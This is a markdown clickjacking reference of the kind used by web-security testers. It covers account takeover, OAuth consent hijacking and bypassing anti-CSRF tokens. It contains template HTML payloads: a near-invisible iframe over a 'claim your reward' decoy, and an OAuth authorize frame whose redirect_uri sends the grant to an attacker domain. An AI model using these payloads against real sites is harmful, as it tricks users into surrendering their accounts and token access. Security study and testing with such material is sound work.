# Clickjacking

## Table of Contents
- [Account Takeover](#account-takeover)
- [Authorization Grant Hijacking](#authorization-grant-hijacking)
- [Bypassing Anti-CSRF Protections](#bypassing-anti-csrf-protections)

## Account Takeover

### A single click can be redirected onto an action that hands the account to the attacker. [^1]

- Confirming an attacker-supplied email address
    ```html
    <style>
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 600px;
            height: 400px;
            opacity: 0.0001;
            z-index: 2;
        }

        #lure {
            position: absolute;
            top: 310px;
            left: 120px;
            z-index: 1;
        }
    </style>

    <div id="lure">Click here to claim your reward</div>
    <iframe src="https://[VULNERABLE-SERVICE]/account/email?pending=attacker@[ATTACKER-DOMAIN]"></iframe>
    ```
    The decoy sits directly under the framed confirmation button, so the victim's click lands on the framed page. The attacker then requests a password reset, which is delivered to their own address.

## Authorization Grant Hijacking

### The victim can be made to approve a consent screen, granting the attacker's application access to their account. [^1]

- Approving an OAuth authorization request
    ```html
    <iframe src="https://[VULNERABLE-SERVICE]/oauth/authorize?client_id=[ATTACKER-CLIENT-ID]&redirect_uri=https://[ATTACKER-DOMAIN]/callback&scope=read:all"></iframe>
    ```
    The lure is positioned over the "Approve" button. Once it is clicked, the attacker's application receives a token for the victim's account and no longer depends on the victim's session.

## Bypassing Anti-CSRF Protections

### An action protected against CSRF can still be triggered, because the request is issued by the victim from the real page rather than forged.

- Triggering a token-protected action
    - The framed page is served to the victim with a valid anti-CSRF token already in the form, and the request is same-site, so neither the token check nor a `SameSite` restriction on the request itself is violated. Protections that stop a forged request do not stop a genuine one that the victim was tricked into sending.

[^1]: Applies when the framed service's session cookie is set with `SameSite=None`. Under the `SameSite=Lax` default, cookies are not attached to cross-site framed requests, so the victim's session does not reach the framed page.
